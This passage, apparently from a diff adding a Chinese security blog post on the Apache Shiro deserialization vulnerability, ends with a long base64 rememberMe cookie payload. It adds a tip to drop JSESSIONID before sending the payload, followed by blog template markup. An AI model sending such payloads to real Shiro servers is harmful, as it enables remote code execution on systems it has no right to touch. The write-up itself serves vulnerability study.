81PF6XEos1uvC2SLOb6cpRuBKmUkjk6SBVnTxdSYPwIZkRucv6PUXbJtOuWZVBvvxMsKBbhHNLkakzT8HH28uzZkPKO33CAOWQjlZW7ymND+nmvP0sjZdWzDXZUBEf7QAZDVddsHWFdf0Z8i3cIta1lo4dywH/EVMdqVaJ6MiX4/q3RHYe3PrdRo1UW4yKdqzYqSEjMjhuVTHCWmTURpc1AuFJSM9p/7uC9owKA6Grh1UP9wy82jbD9fklS/Z0Vnrh9cCPZ7s3q7jQx3fr5GdVTPvDGTkJZDhoOLs7zHh/giaBZIn8PCOhbZqlE2PAHOV9wX1syj0QJpJBijLlAIKeGoFcU1nTD3M1IVURi/Wk6zeQF5zs4zFr1W681Xj0u72LSkHDZuyF2dGOuUgJ2Ej/B/q7i3fDo42Wi/cI2sW4d00TN60YJEHf+xIE3qbmcBiQJgP8DeOF2hn7S8u1JPyFWoSHDV9pBClp8EaRmcxbGqzu0ZZgDfnfo9i2JBD5CmBBoXkXHaHF7VSALywv5AOS2q7YKyiHZJafpmC9QQIpR+8U5t+at8sZSqVjSg76Nv+sPST26XRxPoY315CVNmRNIPWy2BpjD1VsCKB/uOkQY8JtB++K8WdbfnnBZiJJRUoXm8X/+YNoH73dpO2wSmNPS/h0muq5aVrORp9aeztR791ZKx/q5SjvINWfSW0f3Rr7BU135D+EDBbWuRSKR3CS0o8bvVJ6zKVO7AML/Mq77+u6dM192cNIJ0cFwHtGsnL8kkJcNq8cvoZxQcBP52POwSndyzNnxzD/sR/xnlXA+6QAYZW/JUVbnHK5RxnZrYMIYwuEYzO6v1acHTJNoo2tWecLUFBYMLCCLcfwd90TjGreb5CMMtTwMGNr2tsB7K6FspVrs5Tk4sAxK+h4nhS36CTMK0hDsd2Zww/KXbfh5UVBiFUSd4eL20BxvwYFtc3wF38KC1+fqjuh+uKFttRNIu5UigyrgcTgHulln9V8KnqmVvLFnNONU8iuZBgjGm2EA8kzZ2uh0XwQSsJdTiPqy85QwmM+IFurXX5DwGyHZ3PRPMrQclL0vwsFPg0srK0nwAe4e/REgVDCvfIUtGtqbq1JNpViET4jqz7qFJ4L/se45xI4qdrI5ZLRXcDmmJu9IYCErK22AkVEJBu1hyp204MvU3/8TO81OPbrtx0YU+poZCp0L0xKhE336gf5OIQWmPe+YfGJ1g2CgtrtrbzCIK3yEXww6x9JBT7RUGyMjYNiIc9JZ20LA0BxrDnHPtHJHqjPlVua3RRFszxYav2iGmkTQhdRQKJ2oj+LvWgV9UYFH54nWoG399930ZOf+SLtIGH5k3JjkmLWhXieoWR0vNsL82/Sq+xhafCBAw3yZyJf2PINhSQkdqzaDnJPUK1nNtLrnbSw4z32vMJ5Xa4RwNliYFHgYXl4GL6hUjmy8u0TrgVXcaxrKuvcpMDrMcFEbsacdJ8Xknxi0sfrpJ5HVsGwiUQYXMCx</span></span><br></pre></td></tr></table></figure>
+
+<p>Cookie中最好删除JSESSID再发送</p>
+<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png?raw=true" alt="img"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/12/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="leancloud-visitors view" data-flag-title="Shiro反序列化">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/12/20/HGAME2023-Designer-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/11/24/xxe/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-12-13 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/CVE/">CVE<span>9</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web/">web<span>64</span></a></li> <li><a href="/tags/unserialize/">unserialize<span>13</span></a></li> <li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
